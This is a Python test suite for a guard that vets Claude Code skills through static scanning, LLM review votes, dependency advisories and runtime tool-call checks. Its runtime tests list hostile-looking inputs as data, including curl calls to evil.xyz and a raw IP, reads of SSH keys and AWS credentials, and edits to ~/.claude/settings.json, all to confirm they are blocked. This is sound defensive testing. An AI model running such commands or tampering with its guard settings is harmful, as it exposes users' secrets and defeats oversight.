import json, os, subprocess, sys, tempfile, unittest
from pathlib import Path
from unittest import mock
ROOT = Path(__file__).resolve().parent.parent
sys.path[:0] = [str(ROOT), str(ROOT / "tests")]
from guard import cache, deps, gate, llm_review, policy as P, runtime_gate
from guard.collect import collect
from guard.config import load_policy
from guard.static_scan import scan
import make_fixtures as F

GOOD_FACTS = {"canary":"", "purpose":"x", "domains":[], "commands":[], "file_access":[], "downloads_code":False, "dynamic_destinations":False}
GOOD = {"_source":"fake (standard)", "canary":"", "verdict":"safe", "risk":"low", "injection_attempt":False, "purpose_mismatch":False, "findings":[]}

class Base(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(); self.addCleanup(self.tmp.cleanup)
        env = mock.patch.dict(os.environ, {"HOME": self.tmp.name, "SKILL_GUARD_TEST_KEY": "k", "SKILL_GUARD_MANAGED_POLICY": "/nonexistent"})
        env.start(); self.addCleanup(env.stop)
        self.policy = load_policy()
    def static(self, name, files):
        b = collect(F.build(self.tmp.name, name, files), self.policy)
        return b, scan(b, self.policy)

class Attacks(Base):
    def test_every_attack_blocks_statically(self):
        for name, files in {**F.MALICIOUS, **F.TYPOSQUAT}.items():
            with self.subTest(name):
                _, findings = self.static(name, files)
                self.assertEqual(P.decide_static(findings), "block", findings)
    def test_benign_not_blocked(self):
        for name, files in F.BENIGN.items():
            with self.subTest(name):
                _, findings = self.static(name, files)
                self.assertEqual(P.decide_static(findings), "allow", findings)
    def test_symlink_escape(self):
        base = F.build(self.tmp.name, "ln", F.BENIGN["plain"]); (base/"k").symlink_to("/etc/hosts")
        self.assertEqual(P.decide_static(scan(collect(base,self.policy),self.policy)), "block")
    def test_binary(self):
        base = F.build(self.tmp.name, "bin", F.BENIGN["plain"]); (base/"x.dat").write_bytes(b"\0\1\2")
        self.assertEqual(P.decide_static(scan(collect(base,self.policy),self.policy)), "block")
    def test_fake_png(self):
        base = F.build(self.tmp.name, "png", F.BENIGN["plain"]); (base/"a.png").write_bytes(b"\0MZ")
        self.assertEqual(P.decide_static(scan(collect(base,self.policy),self.policy)), "block")

class Decisions(Base):
    def res(self, **kw):
        r = dict(GOOD); r.update(kw.get("review", {})); f = dict(GOOD_FACTS); f.update(kw.get("facts", {}))
        other = {**r, "_source": "other (adversarial)", "_voter": "other:adversarial"}
        reviews = [r, dict(GOOD)] if kw.get("disagree") else [r, other]
        return {"facts": f, "reviews": reviews + kw.get("extra", []), "unreviewed_files": kw.get("left", 0)}
    def d(self, **kw): return P.decide(kw.pop("findings", []), self.res(**kw), self.policy)[0]
    def test_table(self):
        self.assertEqual(self.d(), "allow")
        self.assertEqual(self.d(review={"injection_attempt":True}), "block")
        self.assertEqual(self.d(review={"verdict":"malicious"}), "block")
        self.assertEqual(self.d(review={"verdict":"suspicious"}), "ask")
        self.assertEqual(self.d(review={"risk":"medium"}), "ask")
        self.assertEqual(self.d(review={"verdict":"suspicious"}, disagree=True), "ask")
        self.assertEqual(self.d(facts={"downloads_code":True}), "ask")
        self.assertEqual(self.d(facts={"downloads_code":True}, review={"verdict":"malicious"}, disagree=True), "block")
        self.assertEqual(self.d(facts={"dynamic_destinations":True}), "ask")
        self.assertEqual(self.d(facts={"domains":["unlisted.example.net"]}), "ask")
        self.assertEqual(self.d(facts={"domains":["rentry.co"]}), "ask")
        self.assertEqual(self.d(left=1), "ask")
    def test_one_block_vote_asks(self):
        self.assertEqual(self.d(review={"verdict":"malicious"}, disagree=True), "ask")
        self.assertEqual(self.d(review={"injection_attempt":True}, disagree=True), "ask")
    def test_same_model_and_prompt_votes_once(self):
        bad = {**GOOD, "verdict":"malicious", "_source":"fake (standard, a.md only)", "_voter":"fake:standard"}
        self.assertEqual(self.d(review={"verdict":"malicious", "_voter":"fake:standard"}, disagree=True, extra=[bad]), "ask")
    def test_two_independent_votes_block(self):
        self.assertEqual(self.d(review={"verdict":"malicious"}), "block")
    def test_llm_cannot_clear_static(self):
        f = [{"rule":"x","severity":"block","file":"a","line":1,"message":"m"}]
        self.assertEqual(self.d(findings=f), "block")

class FakeBackend:
    id, model = "fake", "m"
    def __init__(self, fn): self.fn, self.calls = fn, 0
    def complete(self, system, content, schema):
        self.calls += 1
        canary = system.rsplit("exactly ", 1)[1].split(".")[0]
        return self.fn(canary, schema)

def good(canary, schema):
    base = GOOD_FACTS if "purpose" in schema["properties"] else {k: v for k, v in GOOD.items() if k != "_source"}
    return {**base, "canary": canary}

class Failures(Base):
    def run_gate(self, fn):
        base = Path(self.tmp.name)/".claude/skills/plain"
        if not base.exists(): F.build(self.tmp.name, ".claude/skills/plain", F.BENIGN["plain"])
        fake = FakeBackend(fn)
        with mock.patch.object(llm_review, "backends", return_value=[fake]):
            return gate.check_skill("plain", self.tmp.name + "/w", self.policy), fake, base
    def setUp(self):
        super().setUp(); os.makedirs(self.tmp.name + "/w")
    def assert_blocked(self, fn):
        (decision, _), _, _ = self.run_gate(fn); self.assertEqual(decision, "block")
    def test_down(self):
        def f(c, s): raise llm_review.ReviewError("down")
        self.assert_blocked(f)
    def test_malformed(self): self.assert_blocked(lambda c, s: {"verdict": "safe"})
    def test_extra_field(self): self.assert_blocked(lambda c, s: {**good(c, s), "approved": True})
    def test_bad_canary(self): self.assert_blocked(lambda c, s: good("wrong", s))
    def test_non_json(self):
        def f(c, s): raise json.JSONDecodeError("x", "y", 0)
        self.assert_blocked(f)
    def test_missing_skill(self):
        self.assertEqual(gate.check_skill("nope", self.tmp.name, self.policy)[0], "block")
    def test_builtin_allowed_only_without_files(self):
        self.assertEqual(gate.check_skill("simplify", self.tmp.name + "/w", self.policy)[0], "allow")
    def test_builtin_name_with_files_is_reviewed(self):
        F.build(self.tmp.name, ".claude/skills/simplify", F.MALICIOUS["pipe-shell"])
        self.assertEqual(gate.check_skill("simplify", self.tmp.name + "/w", self.policy)[0], "block")
    def test_cache_and_reedit(self):
        (d, _), fake, base = self.run_gate(good); self.assertEqual(d, "allow"); first = fake.calls; self.assertGreater(first, 0)
        (d, _), fake2, _ = self.run_gate(good); self.assertEqual((d, fake2.calls), ("allow", 0))
        (base/"SKILL.md").write_text((base/"SKILL.md").read_text() + " ")
        (d, _), fake3, _ = self.run_gate(good); self.assertGreater(fake3.calls, 0)
    def test_forged_cache_ignored(self):
        _, _, _ = self.run_gate(good)
        for path in (Path(self.tmp.name)/".claude/skill-guard/cache").glob("*.json"):
            e = json.loads(path.read_text()); e["signature"] = "0"*64; path.write_text(json.dumps(e))
        _, fake, _ = self.run_gate(good); self.assertGreater(fake.calls, 0)

class Runtime(Base):
    def c(self, tool, inp, active=True):
        if active: runtime_gate.mark_active("s", "x")
        return runtime_gate.check(tool, inp, "s" if active else "other", self.policy)[0]
    def test_network(self):
        self.assertEqual(self.c("Bash", {"command":"curl https://evil.xyz/a"}), "block")
        self.assertEqual(self.c("Bash", {"command":"curl http://91.92.242.30/a"}), "block")
        self.assertEqual(self.c("Bash", {"command":"curl https://$H/a"}), "ask")
        self.assertEqual(self.c("Bash", {"command":"curl $U"}), "ask")
        self.assertEqual(self.c("Bash", {"command":"eval \"$X\""}), "ask")
        self.assertEqual(self.c("Bash", {"command":"ls -la"}), "allow")
        self.assertEqual(self.c("WebFetch", {"url":"https://evil.xyz"}), "block")
        self.assertEqual(self.c("WebFetch", {"url":"https://docs.claude.com/x"}), "allow")
        self.assertEqual(self.c("mcp__slack__post", {}), "ask")
    def test_github_path_scoped(self):
        self.assertEqual(self.c("Bash", {"command":"git clone https://github.com/evil/x"}), "block")
        self.assertEqual(self.c("Bash", {"command":"git clone https://github.com/anthropics/x"}), "allow")
    def test_no_active_skill_leaves_normal_work_alone(self):
        self.assertEqual(self.c("Bash", {"command":"curl https://example.xyz"}, False), "allow")
    def test_secrets(self):
        self.assertEqual(self.c("Read", {"file_path":"~/.ssh/id_rsa"}), "block")
        self.assertEqual(self.c("Read", {"file_path":"/p/.env"}), "block")
        self.assertEqual(self.c("Bash", {"command":"cat ~/.aws/credentials"}), "block")
        self.assertEqual(self.c("Read", {"file_path":"~/.ssh/id_rsa"}, False), "ask")
    def test_tamper(self):
        self.assertEqual(self.c("Write", {"file_path":"~/.claude/settings.json"}), "block")
        self.assertEqual(self.c("Edit", {"file_path":"/p/.claude/skills/x/SKILL.md"}), "block")
        self.assertEqual(self.c("Bash", {"command":"echo x > ~/.claude/settings.json"}), "block")
        self.assertEqual(self.c("Bash", {"command":"python3 guard/cli.py approve x"}), "block")

class Deps(Base):
    def test_parse(self):
        lock = json.dumps({"packages": {"": {}, "node_modules/a": {"version": "1.0.0"}}})
        found, notes = deps.parse({"package-lock.json": lock, "requirements.txt": "b==2.0\nc>=1\n",
                                   "node_modules/d/package.json": '{"name":"d","version":"3.0.0"}',
                                   "x.dist-info/METADATA": "Name: e\nVersion: 4.0\n"})
        self.assertEqual(found, {("npm","a","1.0.0"),("PyPI","b","2.0"),("npm","d","3.0.0"),("PyPI","e","4.0")})
        self.assertEqual([n["rule"] for n in notes], ["unpinned-deps"])
    def lookup(self, ids, severity="HIGH"):
        reply = {"results": [{"vulns": [{"id": i} for i in ids]}]}
        with mock.patch.object(deps, "_post", return_value=reply), mock.patch.object(deps, "_severity", return_value=severity):
            return deps.lookup([("npm", "a", "1.0.0")])[0]["severity"]
    def test_malicious_blocks(self): self.assertEqual(self.lookup(["MAL-2025-1"]), "block")
    def test_serious_asks(self): self.assertEqual(self.lookup(["GHSA-x"]), "review")
    def test_minor_is_context(self): self.assertEqual(self.lookup(["GHSA-x"], "LOW"), "info")
    def test_lookup_failure_asks_and_is_not_cached(self):
        with mock.patch.object(deps, "_post", side_effect=OSError("offline")) as post:
            for _ in range(2):
                self.assertEqual(deps.check({"requirements.txt": "a==1"}, self.policy)[0]["rule"], "deps-unchecked")
        self.assertEqual(post.call_count, 2)
    def test_new_advisory_reaches_cached_skill(self):
        base = F.build(self.tmp.name, "dep", {**F.BENIGN["plain"], "requirements.txt": "a==1\n"})
        fake = FakeBackend(good)
        with mock.patch.object(llm_review, "backends", return_value=[fake]), mock.patch.object(deps, "lookup", return_value=[]):
            self.assertEqual(gate.check_target(base, self.policy)[0], "allow")
        bad = [{"rule":"malicious-package","severity":"block","file":"dependencies","line":0,"message":"m"}]
        with mock.patch.object(llm_review, "backends", return_value=[fake]), mock.patch.object(deps, "check", return_value=bad):
            self.assertEqual(gate.check_target(base, self.policy)[0], "block")
    def test_pyc_blocks(self):
        base = F.build(self.tmp.name, "pyc", F.BENIGN["plain"]); (base/"__pycache__").mkdir()
        (base/"__pycache__/x.pyc").write_bytes(bytes([0xcb, 0x0d, 0x0d, 0x0a, 0, 0]))
        self.assertEqual(P.decide_static(scan(collect(base,self.policy),self.policy)), "block")

class Config(Base):
    def write(self, text):
        path = Path(self.tmp.name)/".claude/skill-guard/config.toml"
        path.parent.mkdir(parents=True, exist_ok=True); path.write_text(text)
    def picked(self, installed, key=None):
        env = {"ANTHROPIC_API_KEY": "k"} if key else {}
        with mock.patch("shutil.which", side_effect=lambda n: n if n in installed else None), mock.patch.dict(os.environ, env):
            return [b.id for b in llm_review.backends(load_policy())]
    def test_auto_prefers_claude_alone(self):
        self.assertEqual(self.picked({"claude", "codex"}), ["claude-cli"])
    def test_auto_falls_back(self):
        self.assertEqual(self.picked({"codex"}), ["codex-cli"])
        self.assertEqual(self.picked(set(), key=True), ["anthropic-api"])
        with self.assertRaises(llm_review.ReviewError): self.picked(set())
    def test_explicit_list(self):
        self.write('reviewers = ["claude-cli", "codex-cli"]')
        self.assertEqual(self.picked({"claude", "codex"}), ["claude-cli", "codex-cli"])
    def test_explicit_missing_fails_instead_of_swapping(self):
        self.write('reviewers = ["codex-cli"]')
        with self.assertRaises(llm_review.ReviewError): self.picked({"claude"})
    def test_tables_merge(self):
        self.write('[models]\nclaude-cli = "opus"')
        policy = load_policy()
        self.assertEqual((policy["models"]["claude-cli"], policy["models"]["anthropic-api"]), ("opus", "claude-opus-5-5"))
    def test_bad_config_is_an_error(self):
        from guard.config import ConfigError
        for text in ('mdoe = "audit"', 'mode = "off"', 'reviewers = ["gpt"]', 'reviewers = []', 'cache_ttl_days = "x"', 'mode = ', '[models]\nfoo = "x"'):
            with self.subTest(text):
                self.write(text)
                with self.assertRaises(ConfigError): load_policy()
    def test_bad_config_blocks_hook(self):
        self.write('mdoe = "audit"')
        out = subprocess.run([sys.executable, "-I", str(ROOT/"guard/cli.py"), "hook"], input='{"hook_event_name":"SessionStart"}', text=True, capture_output=True, env=os.environ.copy())
        self.assertEqual(out.returncode, 2); self.assertIn("unknown setting", out.stderr)

class Hook(Base):
    def hook(self, event):
        return subprocess.run([sys.executable, "-I", str(ROOT/"guard/cli.py"), "hook"], input=event, text=True, capture_output=True, env=os.environ.copy(), timeout=30)
    def test_bad_input_blocks(self):
        self.assertEqual(self.hook("not json").returncode, 2)
    def test_typed_attack_blocks(self):
        F.build(self.tmp.name, ".claude/skills/bad", F.MALICIOUS["pipe-shell"])
        out = self.hook(json.dumps({"hook_event_name":"UserPromptSubmit","prompt":"/bad","cwd":self.tmp.name+"/","session_id":"s"}))
        self.assertEqual(json.loads(out.stdout)["decision"], "block")
    def test_skill_tool_attack_denies(self):
        F.build(self.tmp.name, ".claude/skills/bad", F.MALICIOUS["pipe-shell"])
        out = self.hook(json.dumps({"hook_event_name":"PreToolUse","tool_name":"Skill","tool_input":{"skill":"bad"},"cwd":self.tmp.name,"session_id":"s"}))
        self.assertEqual(json.loads(out.stdout)["hookSpecificOutput"]["permissionDecision"], "deny")
    def test_read_of_bad_skill_denies(self):
        base = F.build(self.tmp.name, ".claude/skills/bad", F.MALICIOUS["pipe-shell"])
        out = self.hook(json.dumps({"hook_event_name":"PreToolUse","tool_name":"Read","tool_input":{"file_path":str(base/"SKILL.md")},"cwd":self.tmp.name,"session_id":"s"}))
        self.assertEqual(json.loads(out.stdout)["hookSpecificOutput"]["permissionDecision"], "deny")
    def test_plain_prompt_passes(self):
        out = self.hook(json.dumps({"hook_event_name":"UserPromptSubmit","prompt":"hello","cwd":self.tmp.name,"session_id":"s"}))
        self.assertEqual((out.returncode, out.stdout), (0, ""))
    def test_approve_refuses_without_terminal(self):
        out = subprocess.run([sys.executable,"-I",str(ROOT/"guard/cli.py"),"approve","x"], input="approve\n", text=True, capture_output=True, env=os.environ.copy())
        self.assertEqual(out.returncode, 1); self.assertIn("interactive", out.stderr)

if __name__ == "__main__":
    unittest.main()
